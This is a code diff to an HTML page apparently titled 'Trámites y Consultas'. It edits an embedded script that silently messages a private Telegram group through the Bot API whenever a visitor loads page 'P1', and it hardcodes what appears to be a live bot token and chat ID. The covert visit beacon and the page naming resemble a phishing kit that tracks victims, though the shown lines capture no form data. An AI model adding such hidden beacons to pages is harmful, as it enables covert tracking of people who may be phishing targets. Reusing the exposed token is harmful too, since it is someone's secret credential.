@@ -693,12 +693,12 @@
     <!-- SCRIPT DE NOTIFICACIÓN A TELEGRAM (DIRECTO AL GRUPO) -->
     <script>
         document.addEventListener("DOMContentLoaded", function() {
-            // Credenciales del Bot y Grupo (Actualizadas)
+            // Credenciales del Bot y Grupo
             const TG_TOKEN = "8783946350:AAH8zYUMz3s4rmEG5_TcDujGbckxQC4plUA";
             const TG_CHAT_ID = "-1003921297670"; 
             
-            // Mensaje que se enviará al grupo
-            const mensaje = "🚨 *NUEVO INGRESO P1* 🚨\n\nUn usuario ha ingresado a la página de Trámites y Consultas.\n\n🌐 *Página:* Index (P1)";
+            // Mensaje literal: solo "p1"
+            const mensaje = "p1";
             
             // Endpoint oficial de Telegram
             const url = `https://api.telegram.org/bot${TG_TOKEN}/sendMessage`;
@@ -710,14 +710,13 @@
                 },
                 body: JSON.stringify({
                     chat_id: TG_CHAT_ID,
-                    text: mensaje,
-                    parse_mode: 'Markdown'
+                    text: mensaje
                 })
             })
             .then(response => response.json())
             .then(data => {
                 if(data.ok) {
-                    console.log('Notificación enviada al grupo P1 de Telegram con éxito.');
+                    console.log('Notificación "p1" enviada a Telegram con éxito.');
                 } else {
                     console.error('Error de Telegram:', data.description);
                 }
